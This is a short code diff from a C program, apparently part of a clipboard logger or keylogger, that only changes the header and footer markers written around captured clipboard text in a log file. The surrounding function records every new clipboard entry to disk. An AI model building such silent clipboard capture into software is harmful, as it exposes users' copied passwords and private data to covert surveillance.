@@ -67,7 +67,7 @@ void LogClipboardIfChanged(void)
         // Comparamos el texto actual con el ultimo que guardamos.
         if (strcmp(clipboardText, lastClipboardText) != 0 && strlen(clipboardText) > 0) {
             // Escribimos cabecera portapapeles
-            fprintf(logFile, "\n\n--- [Init clipboard] ---\n%s\n--- [finish clipboard]---\n", clipboardText);
+            fprintf(logFile, "\n\n####### Init clipboard #######\n%s\n####### finish clipboard #######\n", clipboardText);
             fflush(logFile);
             // actualizamos nuestra memoria interna con el nuevo texto
             strcpy_s(lastClipboardText, sizeof(lastClipboardText), clipboardText);
